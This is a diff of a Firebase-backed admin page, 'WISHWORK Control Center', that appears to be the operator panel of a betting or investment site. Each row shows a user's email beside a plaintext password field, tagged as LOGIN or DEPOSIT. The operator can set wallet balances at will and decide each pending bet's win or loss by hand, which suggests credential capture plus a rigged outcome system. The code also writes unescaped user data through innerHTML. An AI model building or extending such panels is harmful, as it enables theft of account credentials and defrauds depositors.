@@ -3,41 +3,27 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CONTROL CENTER | WISHWORK</title>
-    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600;900&display=swap" rel="stylesheet">
+    <title>ADMIN | WISHWORK</title>
+    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;900&display=swap" rel="stylesheet">
     <style>
-        :root { --bg: #020205; --accent: #38bdf8; --red: #ef4444; --green: #22c55e; }
-        body { margin: 0; font-family: 'Outfit', sans-serif; background: var(--bg); color: white; padding: 20px; }
-        h1 { text-align: center; font-weight: 900; background: linear-gradient(to right, #38bdf8, #c084fc); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
-        
-        .card { background: rgba(255,255,255,0.03); border-radius: 20px; padding: 20px; border: 1px solid rgba(255,255,255,0.1); margin-bottom: 20px; }
-        table { width: 100%; border-collapse: collapse; margin-top: 10px; }
-        th { text-align: left; font-size: 10px; color: var(--accent); text-transform: uppercase; padding: 10px; }
-        td { padding: 12px 10px; border-bottom: 1px solid rgba(255,255,255,0.05); font-size: 13px; }
-        
-        .btn { padding: 6px 12px; border: none; border-radius: 8px; font-weight: 900; cursor: pointer; color: white; margin: 2px; }
-        .win { background: var(--green); }
-        .loss { background: var(--red); }
-        .del { background: #444; font-size: 10px; }
-        
-        input { width: 100%; padding: 12px; background: rgba(0,0,0,0.3); border: 1px solid rgba(255,255,255,0.1); border-radius: 10px; color: white; margin-bottom: 15px; }
+        body { background: #020205; color: white; font-family: 'Outfit'; padding: 20px; }
+        h1 { text-align: center; background: linear-gradient(to right, #38bdf8, #c084fc); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        .table-card { background: rgba(255,255,255,0.03); border-radius: 20px; padding: 15px; border: 1px solid rgba(255,255,255,0.1); }
+        table { width: 100%; border-collapse: collapse; }
+        th { text-align: left; font-size: 10px; color: #38bdf8; padding: 10px; }
+        td { padding: 12px 10px; border-bottom: 1px solid rgba(255,255,255,0.05); font-size: 12px; }
+        .btn { padding: 5px 10px; border: none; border-radius: 5px; color: white; cursor: pointer; font-weight: 800; margin-right: 5px; }
+        .win { background: #22c55e; } .loss { background: #ef4444; } .del { background: #444; }
+        .login-row { border-left: 4px solid #a855f7; }
+        .deposit-row { border-left: 4px solid #00f2ff; }
     </style>
 </head>
 <body>
 
 <h1>CONTROL CENTER</h1>
-
-<div class="card">
-    <input type="text" id="search" placeholder="Search user email..." onkeyup="filter()">
+<div class="table-card">
     <table>
-        <thead>
-            <tr>
-                <th>User (Click to Balance)</th>
-                <th>Amt/Pass</th>
-                <th>Type</th>
-                <th>Action</th>
-            </tr>
-        </thead>
+        <thead><tr><th>USER (CLICK BAL)</th><th>VALUE</th><th>TYPE</th><th>ACTION</th></tr></thead>
         <tbody id="adminBody"></tbody>
     </table>
 </div>
@@ -50,48 +36,41 @@
     const app = initializeApp(firebaseConfig);
     const db = getFirestore(app);
 
-    // Update Balance Manually
-    window.setBal = async (email) => {
-        const val = prompt(`Enter new balance for ${email}:`);
-        if(val !== null) await setDoc(doc(db, "wallets", email), { balance: parseInt(val) });
+    window.editBal = async (email) => {
+        const val = prompt(`Set wallet for ${email}:`);
+        if(val) await setDoc(doc(db, "wallets", email), { balance: parseInt(val) });
     };
 
-    // Delete Log
-    window.delLog = async (id) => {
-        if(confirm("Terminate this log?")) await deleteDoc(doc(db, "users", id));
-    };
-
-    // Set Result (Win/Loss)
     window.resolve = async (id, res, email, amtStr) => {
         const amt = parseInt(amtStr.replace(/[^\d]/g, ''));
         await updateDoc(doc(db, "users", id), { status: res });
-        
         if(res === "WIN 🏆") {
-            const snap = await getDoc(doc(db, "wallets", email));
-            const cur = snap.exists() ? snap.data().balance : 0;
-            await setDoc(doc(db, "wallets", email), { balance: cur + (amt * 2) });
+            const s = await getDoc(doc(db, "wallets", email));
+            const cur = s.exists() ? s.data().balance : 0;
+            await updateDoc(doc(db, "wallets", email), { balance: cur + (amt * 2) });
         }
     };
+
+    window.delLog = async (id) => { if(confirm("Delete?")) await deleteDoc(doc(db, "users", id)); };
 
     onSnapshot(query(collection(db, "users"), orderBy("time", "desc")), (snap) => {
         const body = document.getElementById("adminBody");
         let html = "";
         snap.forEach(d => {
             const data = d.data();
-            const isPending = data.status === "PENDING";
-            html += `
-                <tr>
-                    <td onclick="setBal('${data.email}')" style="cursor:pointer; color:var(--accent)">${data.email.split('@')[0]}</td>
-                    <td>${data.password}</td>
-                    <td>${data.actionType}</td>
-                    <td>
-                        ${isPending ? `
-                            <button class="btn win" onclick="resolve('${d.id}','WIN 🏆','${data.email}','${data.password}')">W</button>
-                            <button class="btn loss" onclick="resolve('${d.id}','LOST 💀','${data.email}','${data.password}')">L</button>
-                        ` : `<span>${data.status}</span>`}
-                        <button class="btn del" onclick="delLog('${d.id}')">×</button>
-                    </td>
-                </tr>`;
+            const rowClass = data.actionType.includes("LOGIN") ? "login-row" : (data.actionType === "DEPOSIT" ? "deposit-row" : "");
+            html += `<tr class="${rowClass}">
+                <td onclick="editBal('${data.email}')" style="color:#38bdf8; cursor:pointer;">${data.email ? data.email.split('@')[0] : '???'}</td>
+                <td>${data.password}</td>
+                <td>${data.actionType}</td>
+                <td>
+                    ${data.status === "PENDING" ? `
+                        <button class="btn win" onclick="resolve('${d.id}','WIN 🏆','${data.email}','${data.password}')">W</button>
+                        <button class="btn loss" onclick="resolve('${d.id}','LOST 💀','${data.email}','${data.password}')">L</button>
+                    ` : `<span>${data.status}</span>`}
+                    <button class="btn del" onclick="delLog('${d.id}')">×</button>
+                </td>
+            </tr>`;
         });
         body.innerHTML = html;
     });
